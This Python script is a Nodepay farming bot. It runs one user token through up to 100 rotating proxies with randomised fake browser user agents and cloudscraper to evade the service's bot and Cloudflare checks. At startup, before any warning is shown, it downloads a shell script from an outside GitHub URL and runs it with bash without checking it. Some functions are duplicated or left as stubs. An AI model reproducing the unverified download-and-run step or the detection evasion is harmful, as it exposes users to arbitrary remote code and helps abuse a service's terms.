import asyncio
import aiohttp
import time
import uuid
import cloudscraper
from loguru import logger
from fake_useragent import UserAgent
import requests
import os

def loading_step():
    print("Mengunduh dan menjalankan skrip display...")
    

    url = "https://raw.githubusercontent.com/Wawanahayy/JawaPride-all.sh/refs/heads/main/display.sh"
    try:
        response = requests.get(url)
        response.raise_for_status()  
        script_content = response.text
        
        # Menyimpan skrip yang diunduh ke file sementara
        with open("display.sh", "w") as file:
            file.write(script_content)
        
   
        os.system("bash display.sh")
        
    except requests.exceptions.RequestException as e:
        print(f"Error saat mengunduh skrip: {e}")


loading_step()

def show_warning():
    confirm = input("By using this tool means you understand the risks. do it at your own risk! \nPress Enter to continue or Ctrl+C to cancel... ")

    if confirm.strip() == "":
        print("Continuing...")
    else:
        print("Exiting...")
        exit()
# Constants
PING_INTERVAL = 60
RETRIES = 60

DOMAIN_API = {
    "SESSION": "http://api.nodepay.ai/api/auth/session",
    "PING": [
        "http://13.215.134.222/api/network/ping",
        "http://18.139.20.49/api/network/ping",
        "http://52.74.35.173/api/network/ping",
        "http://52.77.10.116/api/network/ping",
        "http://3.1.154.253/api/network/ping"
    ]
}

async def render_profile_info(proxy, token):
    global browser_id, account_info

    try:
        np_session_info = load_session_info(proxy)

        if not np_session_info:
            # Generate new browser_id
            browser_id = uuidv4()
            response = await call_api(DOMAIN_API["SESSION"], {}, proxy, token)
            valid_resp(response)
            account_info = response["data"]
            if account_info.get("uid"):
                save_session_info(proxy, account_info)
                await start_ping(proxy, token)
            else:
                handle_logout(proxy)
        else:
            account_info = np_session_info
            await start_ping(proxy, token)
    except Exception as e:
        logger.error(f"Error in render_profile_info for proxy {proxy}: {e}")


CONNECTION_STATES = {
    "CONNECTED": 1,
    "DISCONNECTED": 2,
    "NONE_CONNECTION": 3
}

status_connect = CONNECTION_STATES["NONE_CONNECTION"]
browser_id = None
account_info = {}
last_ping_time = {}  

def uuidv4():
    return str(uuid.uuid4())
    
def valid_resp(resp):
    if not resp or "code" not in resp or resp["code"] < 0:
        raise ValueError("Invalid response")
    return resp
    
async def render_profile_info(proxy, token):
    global browser_id, account_info

    try:
        np_session_info = load_session_info(proxy)

        if not np_session_info:
            # Generate new browser_id
            browser_id = uuidv4()
            response = await call_api(DOMAIN_API["SESSION"], {}, proxy, token)
            valid_resp(response)
            account_info = response["data"]
            if account_info.get("uid"):
                save_session_info(proxy, account_info)
                await start_ping(proxy, token)
            else:
                handle_logout(proxy)
        else:
            account_info = np_session_info
            await start_ping(proxy, token)
    except Exception as e:
        logger.error(f"Error in render_profile_info for proxy {proxy}: {e}")
        error_message = str(e)
        if any(phrase in error_message for phrase in [
            "sent 1011 (internal error) keepalive ping timeout; no close frame received",
            "500 Internal Server Error"
        ]):
            logger.info(f"Removing error proxy from the list: {proxy}")
            remove_proxy_from_list(proxy)
            return None
        else:
            logger.error(f"Connection error: {e}")
            return proxy

async def call_api(url, data, proxy, token):
    user_agent = UserAgent(os=['windows', 'macos', 'linux'], browsers='chrome')
    random_user_agent = user_agent.random
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": random_user_agent,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://app.nodepay.ai",
    }

    try:
        scraper = cloudscraper.create_scraper()

        response = scraper.post(url, json=data, headers=headers, proxies={
                                "http": proxy, "https": proxy}, timeout=30)

        response.raise_for_status()
        return valid_resp(response.json())
    except Exception as e:
        logger.error(f"Error during API call: {e}")
        raise ValueError(f"Failed API call to {url}")

async def start_ping(proxy, token):
    try:
        while True:
            await ping(proxy, token)
            await asyncio.sleep(PING_INTERVAL)
    except asyncio.CancelledError:
        logger.info(f"Ping task for proxy {proxy} was cancelled")
    except Exception as e:
        logger.error(f"Error in start_ping for proxy {proxy}: {e}")
        
async def ping(proxy, token):
    global last_ping_time, RETRIES, status_connect

    current_time = time.time()

    # Pastikan waktu tunggu antar ping terpenuhi
    if proxy in last_ping_time and (current_time - last_ping_time[proxy]) < PING_INTERVAL:
        logger.info(f"Skipping ping for proxy {proxy}, not enough time elapsed")
        return

    last_ping_time[proxy] = current_time

    try:
        data = {
            "id": account_info.get("uid"),
            "browser_id": browser_id,  
            "timestamp": int(time.time())
        }

        for url in DOMAIN_API["PING"]:
            try:
                # Mencoba URL saat ini
                logger.info(f"Trying ping to {url} via proxy {proxy}")
                response = await call_api(url, data, proxy, token)

                # Jika berhasil, catat log dan keluar dari loop
                if response["code"] == 0:
                    logger.info(f"Ping successful via {url} using proxy {proxy}: {response}")
                    RETRIES = 0
                    status_connect = CONNECTION_STATES["CONNECTED"]
                    break  # Hentikan iterasi jika URL berhasil
                else:
                    logger.warning(f"Ping failed via {url}: {response}")

            except Exception as e:
                logger.error(f"Error pinging {url} via proxy {proxy}: {e}")

        else:
            # Jika semua URL gagal
            handle_ping_fail(proxy, None)

    except Exception as e:
        logger.error(f"Ping failed via proxy {proxy}: {e}")
        handle_ping_fail(proxy, None)


def handle_ping_fail(proxy, response):
    global RETRIES, status_connect

    RETRIES += 1
    if response and response.get("code") == 403:
        handle_logout(proxy)
    elif RETRIES < 2:
        status_connect = CONNECTION_STATES["DISCONNECTED"]
    else:
        status_connect = CONNECTION_STATES["DISCONNECTED"]

def handle_logout(proxy):
    global status_connect, account_info

    status_connect = CONNECTION_STATES["NONE_CONNECTION"]
    account_info = {}
    save_status(proxy, None)
    logger.info(f"Logged out and cleared session info for proxy {proxy}")

def load_proxies(proxy_file):
    try:
        with open(proxy_file, 'r') as file:
            proxies = file.read().splitlines()
        return proxies
    except Exception as e:
        logger.error(f"Failed to load proxies: {e}")
        raise SystemExit("Exiting due to failure in loading proxies")

def save_status(proxy, status):
    pass  

def save_session_info(proxy, data):
    data_to_save = {
        "uid": data.get("uid"),
        "browser_id": browser_id  
    }
    pass

def load_session_info(proxy):
    return {}  

def is_valid_proxy(proxy):
    return True  

def remove_proxy_from_list(proxy):
    pass  

async def main():
    all_proxies = load_proxies('proxy.txt')  
    # Take token input directly from the user
    token = input("Nodepay token: ").strip()
    if not token:
        print("Token cannot be empty. Exiting the program.")
        exit()

    while True:
        active_proxies = [
            proxy for proxy in all_proxies if is_valid_proxy(proxy)][:100]
        tasks = {asyncio.create_task(render_profile_info(
            proxy, token)): proxy for proxy in active_proxies}

        done, pending = await asyncio.wait(tasks.keys(), return_when=asyncio.FIRST_COMPLETED)
        for task in done:
            failed_proxy = tasks[task]
            if task.result() is None:
                logger.info(f"Removing and replacing failed proxy: {failed_proxy}")
                active_proxies.remove(failed_proxy)
                if all_proxies:
                    new_proxy = all_proxies.pop(0)
                    if is_valid_proxy(new_proxy):
                        active_proxies.append(new_proxy)
                        new_task = asyncio.create_task(
                            render_profile_info(new_proxy, token))
                        tasks[new_task] = new_proxy
            tasks.pop(task)

        for proxy in set(active_proxies) - set(tasks.values()):
            new_task = asyncio.create_task(
                render_profile_info(proxy, token))
            tasks[new_task] = proxy
        await asyncio.sleep(3)
    await asyncio.sleep(10)  

if __name__ == '__main__':
    show_warning()
    print("\nAlright, we here! Insert your nodepay token that you got from the tutorial.")
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Program terminated by user.")
